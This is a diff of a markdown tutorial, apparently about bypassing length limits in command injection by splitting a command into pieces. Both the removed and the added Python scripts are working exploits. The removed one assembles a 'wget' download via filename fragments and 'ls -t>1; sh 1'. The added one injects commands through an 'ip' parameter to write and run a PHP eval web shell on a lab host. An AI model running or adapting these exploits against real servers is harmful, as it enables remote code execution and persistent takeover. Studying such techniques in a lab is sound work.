@@ -42,28 +42,23 @@ Sample of devide the command:
 ```python
 #!/usr/bin/python
 #-*- coding: utf-8 -*- 
-import requests 
-def GetShell():
-    url = "http://192.168.56.129/shell.php?1="
-    fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
-    for fileName in fileNames:
-        createFileUrl = url+">"+fileName
-        print createFileUrl 
-        requests.get(createFileUrl)
-    getShUrl = url + "ls -t>1"
-    print getShUrl
-    requests.get(getShUrl)
-    getShellUrl = url + "sh 1"
-    print getShellUrl
-    requests.get(getShellUrl)
-    shellUrl = "http://192.168.56.129/1.php"
-    response = requests.get(shellUrl)
-    if response.status_code == 200:
-        print "[*] Get shell !"
-    else :
-        print "[*] fail!"
-if __name__ == "__main__":
-    GetShell()
+
+import requests
+
+url = "http://127.0.0.1:8000/exec2.php"
+for i in "echo '<?php @eval($_POST[1]);?>' > shell.php ":
+    data = {"ip":"0.0.0.0;echo -n \\"+i+">>1"}
+    res = requests.post(url,data=data)
+print("[*] bash shell upload successful!")
+
+data={"ip":"0.0.0.0;bash 1"}
+res=requests.post(url,data=data)
+
+shell="http://127.0.0.1:8000/shell.php"
+
+res=requests.get(shell)
+if  res.status_code == 200:
+    print("[*] get shell successful")
     
 ```
 
